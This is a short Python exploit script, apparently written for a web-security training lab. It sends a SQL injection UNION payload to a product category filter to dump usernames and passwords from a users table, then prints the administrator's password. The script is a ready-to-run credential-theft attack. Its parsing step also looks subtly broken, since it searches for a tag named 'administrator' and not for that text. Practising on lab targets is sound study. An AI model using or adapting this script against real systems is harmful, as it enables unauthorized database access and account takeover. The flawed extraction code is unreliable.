import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': "http://127.0.0.1:8080", 'https': "https://127.0.0.1:8080"}

def exploit_sql_passwd_databas(url):
    username = "administrator"
    path = "/filter?category=Tech+gifts"
    payload = "'UNION select username, password FROM users --"
    
    try:
        r = requests.get(url + path + payload, verify=False, proxies=proxies)
        r.raise_for_status()  # Will raise an HTTPError for bad responses
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
        return False

    res = r.text
    if "administrator" in res:
        print("Found administrator password")
        soup = BeautifulSoup(res, "html.parser")
        
        # Assuming password is found next to the 'administrator' entry
        try:
            password = soup.body.find("administrator").parent.findNext("td").contents[0]
            print("[+] Password for administrator is: " + password)
            return True
        except AttributeError:
            print("[-] Could not find password in the response")
            return False

    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1]  # Corrected this line
    except IndexError:
        print("[-] Usage: python script.py <url>")
        sys.exit(-1)

    print("[+] Dumping the list of all passwords from the database...")
    if not exploit_sql_passwd_databas(url):
        print("[+] Did not find a password from the database.")
